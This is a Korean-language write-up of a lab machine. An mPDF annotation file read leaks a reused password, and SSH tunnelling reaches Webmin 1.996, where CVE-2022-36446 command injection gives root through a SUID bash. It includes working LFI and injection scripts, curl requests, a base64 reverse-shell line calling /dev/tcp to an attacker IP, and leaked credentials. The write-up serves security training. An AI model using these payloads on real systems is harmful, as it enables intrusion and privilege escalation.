---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/cred/reuse
  - tech/web/cmd-injection
  - tech/pivot/ssh-tunnel
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.232
ports: [22, 80]
ports_filtered: [10000]
services: [http, ssh]
cves: [CVE-2022-36446]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.232` · Ubuntu 20.04.5 LTS(커널 5.4.0-136) · Fundamental · 플래그 2개 (**2026-08-20 인스턴스**)
> 진입점: 80 = "HTML→PDF" 변환기, 뒤에 mPDF 6.0 → `<annotation file="...">` 로 임의 파일 읽기 → `/config/config.php` 의 DB 비번을 SSH 에 재사용해 `svc-account`
> 권한상승: 내부 10000 의 Webmin 1.996 에 SSH `-L` 로 접속 → 같은 자격증명으로 unix/PAM 로그인 → CVE-2022-36446(package-updates 인증 후 명령주입)으로 root 컨텍스트 → SUID bash 드롭 → `bash -p` 로 **euid=0**
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.232

### Initial Access – HTML→PDF 변환기의 mPDF `<annotation>` 임의 파일 읽기가 소스에 박힌 DB 자격증명으로, 그것이 다시 SSH 로그인으로 이어짐

**Vulnerability Explanation:** 두 결함이 체인됨.
- 웹앱이 사용자 HTML 을 필터 없이 mPDF 6.0 렌더러에 넘김. mPDF 는 표준 HTML 외에 자체 확장 태그를 파싱하고, 그중 `<annotation file="...">` 은 지정한 로컬 파일을 PDF 첨부(EmbeddedFile)로 삽입 — 웹서버 프로세스 권한의 **임의 파일 읽기**
- 읽어낸 `/config/config.php` 에 DB 비밀번호가 평문으로 박혀 있고, 그 값이 **OS 계정 `svc-account` 의 SSH 비밀번호와 동일** — 자격증명 재사용

**Vulnerability Fix:**
- mPDF 를 신뢰 경계 밖 입력에 쓰지 말 것. 불가피하면 `<annotation>`·스트림 래퍼를 차단하고 렌더러를 격리 계정·컨테이너에서 구동
- 설정 파일을 문서 루트 밖으로 이동. 주석 처리는 은닉이 아님 — 소스가 읽히면 그대로 노출됨
- 애플리케이션 DB 비밀번호와 OS 로그인 비밀번호를 분리

**Severity:** High — 무인증 임의 파일 읽기 단독은 정보 노출이나, 재사용된 자격증명으로 즉시 대화형 셸까지 이어짐

**Steps to reproduce the attack:**
1. `POST /index.php` 의 `html` 파라미터에 `<annotation file="/etc/passwd" …/>` 전송
2. 응답 PDF 에서 `/Type /EmbeddedFile` 스트림을 꺼내 zlib 해제 → `/etc/passwd` 원문, 로그인 계정 `svc-account` 확인
3. gobuster 로 `/config` 확인 → 같은 방식으로 웹루트의 `config/config.php` 읽기
4. 주석 블록 안의 `svc-account : best&_#Password@2021!!!` 회수
5. 같은 자격증명으로 SSH 로그인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.232 | TCP: 22, 80 (10000 = filtered) |

top-1000 과 `-p-` 가 같은 결과. 열린 것은 22·80 둘뿐이고 10000 은 두 스캔 모두 `filtered`.

```text
# Nmap 7.98 scan initiated Thu Aug 20 15:24:28 2026 as: /usr/lib/nmap/nmap --privileged -Pn -T4 --top-ports 1000 -oN quick.log 192.168.248.232
Nmap scan report for 192.168.248.232
Host is up (0.085s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10000/tcp filtered snet-sensor-mgmt

# Nmap done at Thu Aug 20 15:24:40 2026 -- 1 IP address (1 host up) scanned in 11.34 seconds
```
— 출처: `~/PG/Outdated/quick.log`

```text
# Nmap 7.98 scan initiated Thu Aug 20 15:24:17 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.232
Nmap scan report for 192.168.248.232
Host is up (0.090s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp    open     http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Convert HTML to PDF Online
10000/tcp filtered snet-sensor-mgmt
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   83.95 ms 192.168.45.1
2   83.90 ms 192.168.45.254
3   84.72 ms 192.168.251.1
4   84.95 ms 192.168.248.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 15:24:45 2026 -- 1 IP address (1 host up) scanned in 28.72 seconds
```
— 출처: `~/PG/Outdated/nmap.log`

같은 스캔이 나머지를 `closed (reset)` 이라 적음 — 닫힌 포트는 RST 로 답한다는 뜻인데 10000 만 무응답. 「서비스 없음」이 아니라 **응답을 삼키는 무언가가 경로에 있음**. 10000 은 Webmin 기본 포트라 침투 후 내부에서 재확인 대상으로 남김.

박스 이름이 "Outdated" 라 구버전 힌트이나 이름만 믿고 파지 않음. 1차 사료는 nmap 과 실제 배너.

**웹 80 — HTML to PDF**

![[PG-Outdated-mpdf_80.png]]

입력창 하나에 Convert 버튼 하나. 폼 action 은 `/index.php`, 입력 필드는 `<textarea name="html">`. `html` 파라미터를 POST 하면 PDF 응답.

버전 판정 독립 근거 2개 — 응답 헤더와 PDF 메타데이터.

```bash
curl -s -X POST -d 'html=hello' http://192.168.248.232/index.php -D hdr1.txt -o out1.pdf
```

```text
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 06:24:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 14683
Content-disposition: inline; filename="mpdf.pdf"
Cache-Control: public, must-revalidate, max-age=0
Pragma: public
Expires: Sat, 26 Jul 1997 05:00:00 GMT
Last-Modified: Thu, 20 Aug 2026 06:24:57 GMT
Content-Type: application/pdf
```
— 출처: `~/PG/Outdated/hdr1.txt`

`filename="mpdf.pdf"` 가 첫 번째 근거. 두 번째는 PDF 안의 `/Producer` — mPDF 는 이 값을 **UTF-16BE** 로 쓰므로 `strings` 로는 안 보이고 바이트를 직접 디코드해야 함.

```bash
python3 -c "d=open('out1.pdf','rb').read(); i=d.find(b'/Producer'); \
  print(d[i+11:d.find(b')',i+11)].decode('utf-16-be'))"
```

```text
mPDF 6.0
```

**mPDF 6.0** 확정. `[가정]` `/vendor/composer/installed.json` 의 `mpdf/mpdf v6.0.0` 로도 교차확인했으나 그 응답은 산출물로 남기지 않음.

**디렉터리 열거**

```text
/index.php           [32m (Status: 200)[0m [Size: 856]
/vendor              [36m (Status: 301)[0m [Size: 319][34m [--> http://192.168.248.232/vendor/][0m
/config              [36m (Status: 301)[0m [Size: 319][34m [--> http://192.168.248.232/config/][0m
```
— 출처: `~/PG/Outdated/gobuster.log`. 원문에는 ANSI 색상 시퀀스가 붙어 있고, 위 블록은 **ESC 제어바이트(`0x1b`)만 빼고** 나머지를 그대로 옮긴 것(`[32m` 잔재가 그 흔적). 실행 명령행은 미보존

`/config` 와 `/vendor` 가 301. 이름만 봐도 `/config/config.php` 가 다음 목표인데, 읽기는 웹서버가 아니라 **LFI 로** 해야 함 — 웹으로 `.php` 를 요청하면 PHP 가 실행돼 주석 안의 값이 안 보임.

### Initial Access – mPDF `<annotation>` LFI → 자격증명 재사용

`[가정]` `index.php` 자체는 LFI 로 읽었으나 그 출력을 산출물로 저장하지 않아 소스 인용 불가. 다만 데이터 흐름은 실측으로 성립함 — `html` 파라미터에 넣은 확장 태그가 mPDF 파서까지 도달해 첨부를 생성했으므로, 사용자 입력이 필터 없이 `WriteHTML()` 계열로 들어간다는 결론은 안전함.

페이로드:

```text
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="a" pos-x="195" />
```

- `file="..."` — 실제로 읽어 첨부할 경로. 이것이 본체
- `content` — **빠지면 태그가 통째로 버려짐.** mPDF 6.0.0 의 `ANNOTATION` 분기가 `isset($attr['CONTENT'])` 가 아니면 바로 `break` 함 → 첨부 객체 자체가 안 만들어짐
- `icon`·`title`·`pos-x` — 선택. 없으면 각각 `Note`·빈 문자열·`0` 이 기본값으로 들어감. 공개 PoC 관례를 그대로 따라 넣은 것이고, **이 박스에서 하나씩 빼 보지는 않았음(관측 없음)**

— 속성 필요/불필요 판정 출처: mPDF `v6.0.0` `mpdf.php` 의 `case 'ANNOTATION'`

읽은 내용은 화면에 렌더되지 않고 **PDF 안의 EmbeddedFile 스트림**으로 들어감. `pdfdetach` 가 Kali 에 없어 추출기를 직접 작성.

```python
#!/usr/bin/env python3
# mPDF annotation LFI - extract embedded file stream from generated PDF
import sys, re, zlib
d = open(sys.argv[1],'rb').read()
i = d.find(b'/Type /EmbeddedFile')
if i < 0:
    print('[!] no EmbeddedFile object'); sys.exit(1)
s = d.find(b'stream', i) + len(b'stream')
if d[s:s+2] == b'\r\n': s += 2
elif d[s:s+1] in (b'\n', b'\r'): s += 1
e = d.find(b'endstream', s)
raw = d[s:e]
try:
    out = zlib.decompress(raw)
except Exception:
    out = raw
sys.stdout.buffer.write(out)
```
— 출처: `~/PG/Outdated/extract_attach.py`

FileAttachment 스트림이 `/FlateDecode` 라 zlib 해제 필요. 압축이 아닐 때를 대비해 raw 폴백. `[!] no EmbeddedFile object` 분기가 중요함 — **읽기 실패는 에러가 아니라 「첨부 객체 자체가 없음」으로 나타나기 때문**.

한 줄 헬퍼:

```bash
#!/bin/bash
# mPDF 6.0 <annotation> arbitrary file read against http://192.168.248.232/index.php
# usage: ./lfi.sh /etc/passwd
F="$1"
curl -s -m 30 -X POST --data-urlencode "html=<annotation file=\"$F\" content=\"$F\" icon=\"Graph\" title=\"a\" pos-x=\"195\" />" http://192.168.248.232/index.php -o /tmp/lfi.pdf
python3 ~/PG/Outdated/extract_attach.py /tmp/lfi.pdf
```
— 출처: `~/PG/Outdated/lfi.sh`

`--data-urlencode` 는 안전 습관으로 쓴 것 — 페이로드에 `&`·`+`·`%` 가 하나라도 섞이면 `-d` 는 거기서 파라미터를 자르거나 값을 바꿈. 이 페이로드에는 그 셋이 없어 `-d` 로도 같은 값이 도달함(`<`·`>`·`"`·`/`·공백은 폼 인코딩에서 특수문자가 아님). **속성값에 임의 경로를 넣는 도구라 `--data-urlencode` 를 기본으로 둘 것.**

`/etc/passwd` 35줄 중 로그인 가능 계정은 하나:

```text
svc-account:x:1000:1000::/home/svc-account:/bin/bash
```
— 출처: `~/PG/Outdated/try1_annotation_passwd.pdf` (`extract_attach.py` 로 추출 시 35줄, 마지막 줄이 위 항목)

`php://filter/convert.base64-encode/resource=<경로>` 래퍼도 통함(`writeup_notes.txt` 15:31 항목). 반면 `/home/svc-account/.ssh/id_rsa`·`/root/.ssh/id_rsa`·`/etc/shadow` 는 전부 `[!] no EmbeddedFile object` — 웹서버 프로세스 권한 밖. **첨부가 아예 안 만들어지면 곧 권한 부족 신호**임. `[가정]` 이 세 경로의 시도 로그(`try2`·`try3` 자리)는 미보존이라 당시 기록에만 의존함.

`config/config.php` 회수 결과. `[가정]` LFI 에 넘긴 절대 경로는 산출물에 미보존 — Apache Ubuntu 기본 웹루트면 `/var/www/html/config/config.php`:

```php
<?php
/* todo: check if still required
$servername = "localhost";
$username = "svc-account";
$password = "best&_#Password@2021!!!";
$dbname = "project";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
*/
```
— 출처: `~/PG/Outdated/config.php.txt`

전체가 블록 주석 안이라 브라우저로 `/config/config.php` 를 열면 **빈 화면**. LFI 로 소스를 봐야만 보이는 값임. `passwd` 의 `svc-account` 와 이름이 일치 → SSH 재사용 시도.

```bash
sshpass -p 'best&_#Password@2021!!!' ssh svc-account@192.168.248.232
```

로그인 성공. 플래그 증거는 `whoami; id; hostname; hostname -I; date; cat local.txt` 를 한 명령으로 묶은 출력 전량:

```text
svc-account
uid=1000(svc-account) gid=1000(svc-account) groups=1000(svc-account)
outdated
192.168.248.232 
Thu 20 Aug 2026 06:28:36 AM UTC
a86881c4c605f79f5388ddc73e57866e
Connection to 192.168.248.232 closed.
```
— 출처: `~/PG/Outdated/proof_user.txt`

경로는 `/home/svc-account/local.txt`.

**Local.txt value:**
`a86881c4c605f79f5388ddc73e57866e`

### Privilege Escalation – Webmin 1.996 package-updates 인증 후 명령주입 (CVE-2022-36446)

**Vulnerability Explanation:** Webmin 1.996(< 1.997)의 Software Package Updates 모듈이 설치 대상 패키지 이름을 셸 명령으로 조립하며 이스케이프를 무효화함.
- 싱크는 `software/apt-lib.pl` 의 `update_system_install` — `quotemeta` 로 메타문자를 이스케이프한 **직후** 정규식이 백슬래시를 도로 벗김
- 결과적으로 `;`·`|` 가 그대로 셸에 도달하고, Webmin 데몬(MiniServ)이 root 로 구동되므로 주입 명령도 **root 로 실행**됨
- 인증은 unix/PAM 이라 `svc-account` 자격증명이 그대로 통하고, 그 계정에 package-updates 모듈 접근권이 있음

**Vulnerability Fix:**
- Webmin 을 1.997 이상으로 패치
- package-updates 같은 고위험 모듈을 일반 계정 ACL 에서 제외하고, 10000 을 `0.0.0.0` 이 아니라 관리망 인터페이스에만 바인딩. 경계 방화벽 하나에만 기대면 내부 접근이 곧 관리자 접근이 됨

**Severity:** Critical — 저권한 OS 계정 자격증명만으로 root 명령 실행

**Steps to reproduce the attack:**
1. `ss -lntp` 로 내부 10000 리슨 확인 → SSH `-L` 로컬 포워딩으로 Kali 에서 접근
2. `session_login.cgi` 에 `svc-account` 자격증명 POST → 쿠키 항아리에 `sid` 획득
3. `/package-updates/` 를 열어 모듈 본문이 오는지로 접근권 확인
4. `update.cgi` 에 `u=;echo <base64>|base64 -d|bash;` · `mode=new` · `confirm=1` 전송, `Referer` 헤더 동봉
5. 주입 명령으로 `/tmp/rootbash` SUID bash 드롭
6. svc-account SSH 세션에서 `/tmp/rootbash -p` 실행 → euid=0

**열거로 무엇을 봤는가**

반사 명령들을 `enum.sh` 하나로 묶어 SSH 로 밀어 넣고 결과를 파일로 회수. 발췌:

```text
=== id ===
uid=1000(svc-account) gid=1000(svc-account) groups=1000(svc-account)
=== sudo -n -l ===
sudo: a password is required
=== SUID ===
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/chsh
=== CAPS ===
/snap/core20/1778/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
=== crontab -l ===
no crontab for svc-account
=== listening ===
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        511              0.0.0.0:80             0.0.0.0:*              
LISTEN  0        4096             0.0.0.0:10000          0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
=== uname ===
Linux outdated 5.4.0-136-generic #153-Ubuntu SMP Thu Nov 24 15:56:58 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
=== webmin ver ===
1.996
```
— 출처: `~/PG/Outdated/enum_user.txt` (스크립트 원본은 `enum.sh`)

`sudo -n` 이 비밀번호를 요구했으므로 비밀번호를 쥔 상태에서 다시 침:

```text
[sudo] password for svc-account: Sorry, user svc-account may not run sudo on outdated.
```
— 출처: `~/PG/Outdated/try4_sudo_l.txt`

SUID 는 Ubuntu 20.04 표준 목록 그대로, capabilities 다섯 개도 전부 네트워크용(`cap_net_raw`·`cap_net_bind_service`)이라 쓸 것 없음. `/etc/cron.d` 도 배포판 기본 파일(`e2scrub_all`·`php`·`popularity-contest`)뿐. 열거 반사 전반은 [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]].

남는 것은 `ss` 의 세 번째 줄 — **`0.0.0.0:10000`**. Webmin 은 로컬 전용 바인딩이 아니라 **모든 인터페이스에 떠 있음**. nmap 이 filtered 로 본 이유는 바인딩이 아니라 **경로상 방화벽**이 트래픽을 삼켰기 때문임. 박스 안에서는 그대로 붙으면 되고, Kali 에서 붙으려면 SSH 로컬 포워딩 하나면 됨.

```bash
ssh -L 127.0.0.1:10000:127.0.0.1:10000 svc-account@192.168.248.232
```

`-L <로컬바인드>:<원격이 보는 주소>:<원격포트>` — Kali 의 `127.0.0.1:10000` 으로 온 것을 SSH 세션 반대편이 자기 `127.0.0.1:10000` 으로 내보냄. 이후 curl 은 전부 Kali 에서 `https://127.0.0.1:10000/` 로 침. `-k` 는 MiniServ 자체서명 인증서 때문에 필수이고, 스킴이 `https` 인 것도 중요함 — MiniServ 가 SSL 모드로 떠 있어 평문 http 로는 정상 응답이 안 옴.

버전 근거 2개 — `/usr/share/webmin/version` = `1.996`(`enum_user.txt` 의 `=== webmin ver ===`), 그리고 모듈 응답 HTML 의 제목:

```text
<title>Software Package Updates - Webmin 1.996 on outdated (Ubuntu Linux 20.04.5)</title>
```
— 출처: `~/PG/Outdated/pu.html`

**왜 그것이 권한상승이 되는가**

Webmin 은 unix/PAM 인증을 쓸 수 있고 `svc-account` 자격증명이 그대로 통함.

```bash
curl -sk -c cj.txt -H 'Cookie: testing=1' \
    https://127.0.0.1:10000/session_login.cgi \
    --data 'user=svc-account&pass=best%26_%23Password%402021%21%21%21'
```

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_127.0.0.1	FALSE	/	TRUE	0	sid	8066e35697e3c9f53ff07781c2dfff48
```
— 출처: `~/PG/Outdated/cj.txt`

쿠키 항아리에 `sid` 가 떨어진 것이 로그인 성공 신호(4번째 필드 `TRUE` = secure, 접두사 `#HttpOnly_` = httpOnly).

- `-H 'Cookie: testing=1'` — MiniServ 가 **쿠키 지원 여부를 이 마커로 판정**함. 없으면 로그인 처리를 아예 거부하고 `500 Cache issue or no cookies support` 를 돌려줌(로그인 폼으로 되돌리는 것이 아님). 출처: Webmin 1.996 `miniserv.pl` 의 `handle_login`
- 비번의 `&` 는 **반드시** 퍼센트 인코딩할 것 — 날것으로 보내면 POST 바디가 거기서 잘림. 위 요청은 `#`·`@`·`!` 도 함께 인코딩해 보냄(`%23`·`%40`·`%21`)

이 sid 로 모듈 페이지가 열림.

```bash
curl -sk -b cj.txt https://127.0.0.1:10000/package-updates/ -o pu.html
```

**모듈 본문(정상 제목 포함)이 돌아온 것 자체**가 svc-account 에게 package-updates 접근권이 있다는 증거임 — ACL 이 없으면 Webmin 은 모듈 대신 거부 페이지를 줌. (이 요청은 `-o` 로 본문만 받아 상태코드를 캡처하지 않았음)

⚠️ 루트 태그의 `data-access-level="0"` 도 `data-package-updates="1"` 도 **접근권 근거가 될 수 없음.** 둘 다 나중에 Referer 로 거부당한 응답(`exploit_resp.html`)의 같은 태그에 **똑같이 붙어 있음**. 판정 근거는 「모듈 본문이 왔는가」 하나임.

CVE-2022-36446 의 싱크는 `software/apt-lib.pl` 의 `update_system_install`:

```perl
$update = join(" ", map { quotemeta($_) } split(/\s+/, $update));
$update =~ s/\\(-)|\\(.)/$1$2/g;
local $cmd = "$apt_get_command -y ".($force ? " -f" : "")." install $update";
...
&open_execute_command(CMD, "$cmd <".quotemeta($yesfile), 2);
```
— 출처: Webmin `1.996` `software/apt-lib.pl` (중간 생략은 `...`)

둘째 줄이 함정임 — `quotemeta` 로 `;` → `\;` 로 이스케이프한 **직후** 그 정규식이 `\<문자>` → `<문자>` 로 백슬래시를 전부 벗김. 관측된 명령이 `apt-get -y  install` 로 공백 두 칸인 것도 여기서 나옴 — `$force` 가 거짓이 되어 `($force ? " -f" : "")` 가 빈 문자열이 되면서 자리만 남음.

**익스플로잇 — 발화 조건 셋**

주입 지점은 `update.cgi` 의 `u` 파라미터(패키지 이름).

**① 패키지 이름이 `/` 에서 잘림.** `update.cgi` 가 각 항목을 `($p, $s) = split(/\//, $ps);` 로 쪼개 앞 조각만 패키지 이름으로 씀(`/` 뒤는 패키지 시스템 이름 자리). `/tmp/...` 같은 슬래시 든 페이로드는 거기서 죽음. **명령 전체를 base64 로 감싸** 슬래시를 없앰([[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]]).

```bash
echo -n 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' | base64 -w0
```

```text
Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NzcgL3RtcC9yb290YmFzaA==
```

⚠️ base64 알파벳에는 `/` 가 **들어갈 수 있음.** 페이로드마다 눈으로 확인하고, 걸리면 hex 로 바꿀 것(`echo <hex> | xxd -r -p | bash` — hex 알파벳은 `0-9a-f` 뿐이라 안전).

**② `mode=new` 가 필수.** `update.cgi` 는 `&package_install($p, $s, $in{'mode'} eq 'new')` 로 호출함. 세 번째 인자가 거짓이면 존재하지 않는 이름(=주입 문자열)은 설치 가능 목록 어디에도 없으므로 `update_system_install` 에 도달하지 못하고 return.

```perl
if (!$pkg && $install) {
	# Assume that it will exist
	$pkg = { 'system' => $system || $software::update_system,
		 'name' => $name };
	}
if (!$pkg) {
	print &text('update_efindpkg', $name),"<p>\n";
	return ( );
	}
```
— 출처: Webmin `1.996` `package-updates/package-updates-lib.pl` 의 `package_install`. `$install` 이 곧 `mode=new` 여부이고, 참일 때만 「있다 치고」 진행함

**③ `Referer` 헤더가 필수.** 이 박스에서 시간을 태운 곳임 — 자세한 진단 서사는 [[_PLAYBOOK#A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다]].

`confirm=1` 도 함께 보냄. **필수 여부는 이 박스에서 확정되지 않음** — 당시 기록(`writeup_notes.txt`)은 「confirm 없으면 dry-run 만 돌고 설치 안 됨」으로 적었으나, 소스상으로는 주입 문자열이 어떤 패키지에도 매칭되지 않아 `list_package_operations` 결과가 빈 배열이 되고 `if (@ops) { 확인 폼 } else { 설치 }` 에서 설치 분기로 떨어짐. 이 조건만 따로 떼어 검증한 적 없음 `[가정]`. 재현할 때는 붙여 보낼 것.

최종 요청:

```bash
SID=8066e35697e3c9f53ff07781c2dfff48
CMD='cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash'
B64=$(echo -n "$CMD" | base64 -w0)     # 슬래시 없는지 눈으로 확인
curl -sk -b "sid=$SID" -e 'https://127.0.0.1:10000/package-updates/' \
  'https://127.0.0.1:10000/package-updates/update.cgi' \
  --data-urlencode "u=;echo $B64|base64 -d|bash;" \
  --data-urlencode 'confirm=1' --data-urlencode 'mode=new'
```

`-e <URL>` 이 `Referer` 를 붙임. `-b` 는 세션 쿠키.

응답 본문이 스스로 실행을 증언함. 아래는 **먼저 시도했던 리버스셸 페이로드**의 응답에서 뜯은 것 — rootbash 요청의 응답은 저장하지 않아 실측으로 남은 것이 이쪽뿐임([[_PLAYBOOK#A-63. 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다]]).

```html
<tt>apt-get -y  install ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDMgMD4mMQ==|base64 -d|bash;</tt>
```

```text
0 upgraded, 0 newly installed, 0 to remove and 78 not upgraded.
```
— 출처: `~/PG/Outdated/resp2.html`

`YmFzaCAt…` 를 디코드하면 `bash -i >& /dev/tcp/192.168.45.207/443 0>&1`. `apt-get -y install` 뒤에 주입 문자열이 그대로 붙어 있음 — **명령이 root 로 실행됐다는 증거**. 그런데도 리버스셸은 안 붙음([[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]]).

같은 요청에서 `u=` 만 rootbash 명령으로 바꿔 SUID bash 를 떨굼:

```text
-rwsrwxrwx 1 root root 1183448 Aug 20 06:36 /tmp/rootbash
```
— `[가정]` 이 `ls` 출력은 대응 산출물이 `~/PG/Outdated/` 에 없음. 값 자체는 정합적임(모드 4777·owner root·크기가 Ubuntu 20.04 `/bin/bash` 와 동일·시각이 `proof_root.txt` 의 `06:36` 과 일치)

`4777` 이라 `s` 비트가 owner 실행 자리에 붙고 owner 는 root — `bash -p` 로 실행하면 euid 가 유지됨.

### Post-Exploitation

**Proof.txt value:**
`b5fd4782fc9d5e2da021442ffb60c9eb`

경로는 `/root/proof.txt`. SUID bash 를 svc-account SSH 세션에서 `-p` 로 실행해 **웹셸이 아니라 셸에서 원위치 `cat`**:

```text
root
uid=1000(svc-account) gid=1000(svc-account) euid=0(root) groups=1000(svc-account)
outdated
192.168.248.232 
Thu 20 Aug 2026 06:36:56 AM UTC
===
total 27756
drwx------  7 root root     4096 Aug 20 06:11 .
drwxr-xr-x 20 root root     4096 Jan  7  2021 ..
drwxr-xr-x  3 root root     4096 Jan 12  2023 app
lrwxrwxrwx  1 root root        9 Jan 12  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root     3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root     4096 Jan 12  2023 .config
-rw-r--r--  1 root root      589 Jan 12  2023 index.html
drwxr-xr-x  3 root root     4096 Jan  7  2021 .local
-rw-r--r--  1 root root      161 Dec  5  2019 .profile
-rw-------  1 root root       33 Aug 20 06:11 proof.txt
drwxr-xr-x  3 root root     4096 Jan  7  2021 snap
drwx------  2 root root     4096 Jan  7  2021 .ssh
-rw-r--r--  1 root root 28374208 Jul  4  2022 webmin_1.996_all.deb
===
b5fd4782fc9d5e2da021442ffb60c9eb
Connection to 192.168.248.232 closed.
```
— 출처: `~/PG/Outdated/proof_root.txt`

읽어야 할 것 셋:
- **`uid=1000(svc-account) … euid=0(root)`** — 완전한 root 셸이 아니라 **euid 만 0**. `whoami` 가 `root` 로 나오는 것은 whoami 가 euid 를 보기 때문임. SUID 드롭 경로의 정상 상태이고 파일 읽기에는 충분하나, 「root 셸 획득」으로 뭉뚱그려 적지 말 것
- `/root/webmin_1.996_all.deb` (28374208 bytes, 2022-07-04) — 출제 의도가 Webmin 경로였음을 확인
- `/root/.bash_history -> /dev/null` — 히스토리 수집 경로 없음

**증거 형식** — 두 proof 파일 모두 `whoami; id; hostname; hostname -I; date; cat <플래그>` 를 한 명령으로 묶은 출력 전량. **웹셸이 아니라 pty 가 붙은 셸에서 읽었다는 근거 둘:**

- 말미의 `Connection to 192.168.248.232 closed.` — pty 를 할당한 ssh 클라이언트만 출력하는 줄(`ssh -tt host "cmd"` 는 출력, `ssh host "cmd"` 는 미출력)
- 두 파일의 줄끝이 **CRLF** — 터미널의 `ONLCR` 후처리 흔적임. 같은 디렉터리의 `enum_user.txt`·`try4_sudo_l.txt` 는 LF 라 대조가 됨

다만 타겟 셸 프롬프트 자체를 캡처한 산출물은 0건 — 명령을 `ssh -tt … "묶은 명령"` 형태로 밀어 넣어 프롬프트가 렌더된 적이 없음.

**스크린샷** — `파일보관\PG-Outdated-mpdf_80.png` 1장(웹 80 변환 폼)뿐. 나머지 작업이 헤드리스라 화면이 없고 **박스가 정지돼 추가 촬영 불가**.

**남긴 흔적**

확인함:
- `/tmp/rootbash` · `/tmp/whoami_root` — 삭제 후 `ls` 로 부재 확인
- Kali tmux 세션 `out_nmap`·`out_gobust`·`out_nc`·`out_fwd` — 세션 이름으로만 종료, `tmux ls` 로 소멸 확인. `ss -lntp` 에 443·10000 리스너 없음
- 계정 생성·원본 파일 수정 없음. Webmin 주입이 `apt-get install` 을 태웠으나 응답 원문이 `0 upgraded, 0 newly installed, 0 to remove and 78 not upgraded.` — 존재하지 않는 「패키지」라 실제 설치 변화 없음

미확인:
- Webmin 이 apt 실행 중 만든 캐시·락 파일(`/var/cache/apt` 등) 잔재 여부 — root 권한 회수 후라 재확인 못 함. 기능적 영향 없음으로 판단
- svc-account 로그인이 남긴 Webmin 세션 로그(`/var/webmin/miniserv.log`) — root 소유라 정리 불가, 보존

## 관련

- CVE-2022-36446 — Webmin < 1.997 Software Package Updates authenticated RCE. 싱크는 `software/apt-lib.pl` 의 `update_system_install`
- Webmin 1.996 원본 소스 — `github.com/webmin/webmin` tag `1.996` (이 노트의 perl 인용 검증에 사용)
- mPDF `<annotation file="">` arbitrary file read (mPDF 6.x 계열)
- GTFOBins: `bash` (SUID) — `bash -p`
